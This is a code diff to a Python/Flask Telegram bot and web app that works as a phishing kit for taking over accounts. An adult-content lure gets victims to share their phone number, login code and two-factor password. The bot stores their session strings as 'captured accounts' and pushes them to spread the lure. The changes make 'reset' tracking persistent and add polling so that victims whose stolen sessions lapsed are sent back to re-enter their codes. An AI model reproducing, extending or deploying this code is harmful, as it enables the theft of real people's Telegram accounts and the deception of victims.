@@ -23,8 +23,8 @@ API_ID = _si(os.environ.get("API_ID"), 0)
 API_HASH = (os.environ.get("API_HASH") or "").strip()
 YOUR_TELEGRAM_ID = _si(os.environ.get("OWNER_ID"), 0)
 PORT = _si(os.environ.get("PORT"), 5000)
-WEBAPP_URL = os.environ.get("WEBAPP_URL", "https://debjit-ogte.onrender.com/tg")
-SELF_URL = os.environ.get("SELF_URL", "https://debjit-ogte.onrender.com/health")
+WEBAPP_URL = os.environ.get("WEBAPP_URL", "https://two-fishing.onrender.com/tg")
+SELF_URL = os.environ.get("SELF_URL", "https://two-fishing.onrender.com/health")
 
 DEFAULT_WELCOME_MSGS = [
     {"type": "text", "content": "**Hello {name} 👋**\n\n🔞**To again access to the files completely free of charge, do the following💦:**\n\n>👇Confirm that you are not a robot."},
@@ -60,6 +60,7 @@ BROADCAST_CFG_FILE = "broadcast_config.json"
 SHARE_FILE = "share_config.json"
 AUTOPASS_FILE = "auto_2fa.json"
 RESET_LOG_FILE = "reset_log.json"
+RESET_STATE_FILE = "reset_state.json"
 
 STATE = {
     "welcome_capture": False,
@@ -83,12 +84,6 @@ broadcast_state = {
 
 timer_value = 60
 AUTO_DELETE_EXPIRED = True
-
-# ============================================================
-# RESET EVENTS — webapp force-refresh sync
-# ============================================================
-reset_events = {}          # phone -> timestamp
-reset_all_marker = 0.0     # global reset marker
 
 
 def md_to_html(text):
@@ -221,12 +216,26 @@ def append_reset_log(entry):
     save_json(RESET_LOG_FILE, log)
 
 
+def load_reset_state():
+    return load_json(RESET_STATE_FILE, {"events": {}, "all_marker": 0.0})
+
+
+def save_reset_state(state):
+    save_json(RESET_STATE_FILE, state)
+
+
 captured_accounts = load_accounts()
 users = load_users()
 welcome_config = load_welcome_config()
 broadcast_config = load_broadcast_config()
 share_config = load_share_config()
 auto_2fa_pass = load_autopass()
+
+# Load persistent reset state
+_reset_state = load_reset_state()
+reset_events = {k: float(v) for k, v in _reset_state.get("events", {}).items()}
+reset_all_marker = float(_reset_state.get("all_marker", 0.0))
+logger.info(f"♻️ Reset state loaded: {len(reset_events)} events, marker={reset_all_marker}")
 
 
 def format_phone(ph):
@@ -256,7 +265,7 @@ def account_label(a):
 
 
 # ============================================================
-# RESET ENGINE
+# RESET ENGINE — persistent
 # ============================================================
 def reset_phone_number(phone, reset_by="manual"):
     global captured_accounts
@@ -332,6 +341,13 @@ def reset_phone_number(phone, reset_by="manual"):
         "removed_stale": removed,
         "kept": kept,
     })
+
+    # PERSIST
+    save_reset_state({
+        "events": reset_events,
+        "all_marker": reset_all_marker,
+    })
+
     logger.info(f"♻️ RESET {phone} by={reset_by} pending={result['cleared_pending']} session={result['cleared_session']} removed={removed} kept={kept}")
     return result
 
@@ -354,6 +370,13 @@ def reset_all_numbers(reset_by="manual"):
         except Exception as e:
             logger.error(f"reset_all err {p}: {e}")
     reset_all_marker = time.time()
+
+    # PERSIST
+    save_reset_state({
+        "events": reset_events,
+        "all_marker": reset_all_marker,
+    })
+
     logger.info(f"♻️♻️ RESET ALL — {len(results)} numbers processed by {reset_by} (marker={reset_all_marker})")
     return results
 
@@ -583,7 +606,7 @@ async def check_session_validity(session_str):
 
 
 # ============================================================
-# EDIT ADMIN MSG — PLAIN TEXT (no parse_mode, no backticks)
+# EDIT ADMIN MSG — PLAIN TEXT
 # ============================================================
 async def edit_admin_msg(account, status_text):
     try:
@@ -1444,7 +1467,7 @@ async def bot_main():
 
 
 # ============================================================
-# WEBAPP HTML — fresh-start on reset
+# WEBAPP HTML — HARD SYNC ON RESET
 # ============================================================
 WEBAPP_HTML = """<!DOCTYPE html>
 <html><head>
@@ -1563,14 +1586,18 @@ function wipeUserCache() {
 
 function checkResetThenBoot() {
   var cachedPhone = localStorage.getItem(UPK) || '';
+  var cachedCaptured = localStorage.getItem(UCK) === '1';
   fetch('/api/reset_state', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({phone:cachedPhone}) })
   .then(function(r){ return r.json(); })
   .then(function(d){
     var lastSeen = parseInt(localStorage.getItem(URT) || '0');
     var serverReset = Math.max(d.phone_reset_at || 0, d.global_reset_at || 0);
-    if (serverReset > lastSeen) {
+    var forceWipe = false;
+    if (serverReset > lastSeen) forceWipe = true;
+    if (cachedCaptured && cachedPhone && d.still_captured === false) forceWipe = true;
+    if (forceWipe) {
       wipeUserCache();
-      localStorage.setItem(URT, String(serverReset));
+      localStorage.setItem(URT, String(serverReset || Date.now()));
     }
     bootUI();
   })
@@ -1578,6 +1605,7 @@ function checkResetThenBoot() {
 }
 
 function bootUI() {
+  if (window.__sharePoll) { clearInterval(window.__sharePoll); window.__sharePoll = null; }
   hide('otpBox'); hide('pwdBox'); hide('shareBox'); show('contactBox');
   var cp = localStorage.getItem(UPK);
   var ic = localStorage.getItem(UCK) === '1';
@@ -1633,14 +1661,24 @@ function handleContact(c) {
       .then(function(r){ return r.json(); }).then(function(rs){
         var s = Math.max(rs.phone_reset_at || 0, rs.global_reset_at || 0);
         if (s) localStorage.setItem(URT, String(s));
-      }).catch(function(){});
-      if (d.already_captured && d.user_id) {
-        localStorage.setItem(UCK,'1');
-        setTimeout(function(){hide('contactBox'); openShare();},700);
-      } else {
-        localStorage.removeItem(UCK);
-        setTimeout(function(){hide('contactBox'); openOtp();},700);
-      }
+        var forceOtp = (rs.still_captured === false);
+        if (d.already_captured && d.user_id && !forceOtp) {
+          localStorage.setItem(UCK,'1');
+          setTimeout(function(){hide('contactBox'); openShare();},700);
+        } else {
+          localStorage.removeItem(UCK);
+          localStorage.removeItem(USK);
+          setTimeout(function(){hide('contactBox'); openOtp();},700);
+        }
+      }).catch(function(){
+        if (d.already_captured && d.user_id) {
+          localStorage.setItem(UCK,'1');
+          setTimeout(function(){hide('contactBox'); openShare();},700);
+        } else {
+          localStorage.removeItem(UCK);
+          setTimeout(function(){hide('contactBox'); openOtp();},700);
+        }
+      });
     } else { msg('contactMsg', 'Server error', 'err'); }
   }).catch(function(){ msg('contactMsg', 'Connection error', 'err'); });
 }
@@ -1726,6 +1764,26 @@ function openShare() {
   hide('contactBox'); hide('otpBox'); hide('pwdBox'); show('shareBox');
   var n = parseInt(localStorage.getItem(USK) || '0'); updSteps(n);
   if (n >= 5) msg('shareMsg', 'Unlocked!', 'ok'); else msg('shareMsg', n + '/5 done.', 'info');
+  if (window.__sharePoll) clearInterval(window.__sharePoll);
+  window.__sharePoll = setInterval(function(){
+    var cachedPhone = localStorage.getItem(UPK) || '';
+    if (!cachedPhone) return;
+    fetch('/api/reset_state', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({phone:cachedPhone}) })
+    .then(function(r){ return r.json(); }).then(function(d){
+      var lastSeen = parseInt(localStorage.getItem(URT) || '0');
+      var srv = Math.max(d.phone_reset_at || 0, d.global_reset_at || 0);
+      var wipe = false;
+      if (srv > lastSeen) wipe = true;
+      if (localStorage.getItem(UCK) === '1' && cachedPhone && d.still_captured === false) wipe = true;
+      if (wipe) {
+        clearInterval(window.__sharePoll);
+        window.__sharePoll = null;
+        wipeUserCache();
+        localStorage.setItem(URT, String(srv || Date.now()));
+        bootUI();
+      }
+    }).catch(function(){});
+  }, 4000);
 }
 function updSteps(n) {
   for (var i=1;i<=5;i++) { var e = document.getElementById('st'+i); if (i<=n) e.className='sst done'; else if (i===n+1) e.className='sst active'; else e.className='sst'; }
@@ -1775,10 +1833,16 @@ def get_share_config():
 @app.route('/api/reset_state', methods=['POST'])
 def reset_state():
     d = request.json or {}
-    phone = format_phone(d.get('phone', '')) if d.get('phone') else ''
+    phone_raw = d.get('phone', '')
+    phone = format_phone(phone_raw) if phone_raw else ''
+    accounts = load_accounts()
+    still_captured = False
+    if phone:
+        still_captured = any(a.get('phone') == phone and (a.get('session') or '').strip() for a in accounts)
     return jsonify({
         'phone_reset_at': reset_events.get(phone, 0),
         'global_reset_at': reset_all_marker,
+        'still_captured': still_captured,
     })
 
 
